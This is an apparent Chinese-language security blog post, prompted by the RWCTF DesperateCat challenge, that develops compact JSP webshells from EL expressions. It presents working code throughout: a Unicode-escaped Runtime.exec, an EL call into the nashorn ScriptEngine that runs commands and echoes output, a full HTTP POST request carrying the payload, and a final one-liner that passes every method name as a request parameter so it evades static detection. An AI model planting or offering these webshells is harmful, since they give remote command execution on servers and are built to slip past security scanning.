0x0 RWCTF引发的思考
--------------

​ 前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：

- **禁止传入圆括号、尖括号、引号等**。

​ 如果我们单独处理bypass，那么其实很好解决：

1. 尖括号 &lt;% %&gt;：使用EL表达式

```java
//<%Runtime.getRuntime.exec(request.getParameter("cmd"));%>
//替换成为
${Runtime.getRuntime().exec(param.cmd)}
```

这样就避免出现了尖括号。

2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode

```java
//<%Runtime.getRuntime().exec("calc");%>
<%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%>
```

但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 **'.'** 与 **'='** 。

- **EL中 . 点号属性取值相当于执行对象的 getter 方法，**= **赋值则等同于执行 setter 方法。**

```java
${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
//等同于
pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter("a"));
```

通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。

​ **这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**

0x01 简单尝试与回显问题
==============

我们使用开头提到的EL表达式来试一试：

```php
${Runtime.getRuntime().exec(param.cmd)}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-420ee4be629fb1eb3952fa5c05a853144131090f.png)  
执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：**调用ScriptEngine来执行js**。

> 我们使用ScriptEngine构造出的webshell是这样的：
> 
> ```php
> <%@ page import="javax.script.ScriptEngineManager" %>
> <%@ page import="java.util.Base64" %>
> <%@ page import="java.io.BufferedReader" %>
> <%@ page import="java.io.InputStreamReader" %>
> <%@ page contentType="text/html;charset=UTF-8" language="java" %>
> <%
>     String s = "s=[3];s[0]='cmd';s[1]='/c';s[2]='";
>     String cmd = request.getParameter("cmd");
>     String rt = new String(Base64.getDecoder().decode("JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs="));
>     Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s + cmd + rt);
>     InputStreamReader reader = new InputStreamReader(process.getInputStream());
>     BufferedReader buffer = new BufferedReader(reader);
>     s = null;
>     while ((s = buffer.readLine()) != null) {
>         response.getWriter().println(s);
>     }
> %>
> ```
> 
> 很好理解，获取nashorn JavaScript引擎实现命令执行。

想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。

0x02 EL + ScriptEngine
======================

首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。

```java
//test.jsp
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}
```

首先反射获取ScriptEngineManager对象：

```php
test.jsp?spr1=javax.script.ScriptEngineManager
```

然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：

```php
try{
    load("nashorn:mozilla_compat.js");
}
catch (e){
}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
s=[2];
s[0]='cmd';
s[1]='/c whoami /all';
a="";
b=java.lang.Runtime.getRuntime().exec(s).getInputStream();
output+=new BufferedReader(new+InputStreamReader(b));
while ((line=output.readLine()) != null) 
{
    o=o+line+"\n"
};o
```

然后我们将其传入执行js，最终的包长这样

```php
POST /test.jsp?spr1=javax.script.ScriptEngineManager HTTP/1.1
Host: 172.20.10.2:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=4A34A77B78CD48404804BFD7420A0195
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 414

spr2=try{load("nashorn%3amozilla_compat.js")%3b}catch(e){}importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d'cmd'%3bs[1]%3d'/c+whoami'%3ba%3d""%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+{a%3da%2bline%2b"\n"}%3ba
```

然后执行，没有问题。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-cb8c1f40375af7f16ef1848284c0a7041b52bb23.png)

0x03 进一步混淆
==========

虽然已经可以通过传递指定js脚本执行命令，但仔细来看

```jsp
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}
```

这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。

在EL表达式中，我们知道获取属性可以使用a.b或者a\['b'\]，使用后者就意味着我们可以把所有属性和方法转化成字符串：

```php
${""["getClass"]()["forName"]("javax.script.ScriptEngineManager")["newInstance"]()["getEngineByName"]("JavaScript")["eval"]("...")}
```

那么这样做有什么好处呢？

首先我们可以**随意拼接**：

```php
${""["ge"+"tCl"+"ass"]()["for"+"Name"]("javax.scr"+"ipt.ScriptEng"+"ineManager")["newIn"+"stance"]()["getEng"+"ineByName"]("Java"+"Script")["e"+"val"]("...")}
```

更重要的是如此我们可以**将字符串通过param.xxx**来传递，这样就可以实现如下的改造：

```php
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}
```

测试后可以执行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a031665e34e5ede2610a3e482aff6f691b867aa9.png)

这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。

0x04 总结
=======

这个小思路也是启发于这位师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的另类使用。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b3df826b2bba42b5c45e15ed28927f2f94378e0b.png)

我们从最初的

```php
${Runtime.getRuntime().exec(param.cmd)}
```

到

```php
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}
```

再到

```php
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}
```

可以发现这种webshell的优势也很明显：

- **足够小，一句话就可以实现命令执行+回显的功能**。
- **避免出现&lt;%、Class、eval等敏感字符，具有bypass能力**。

当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。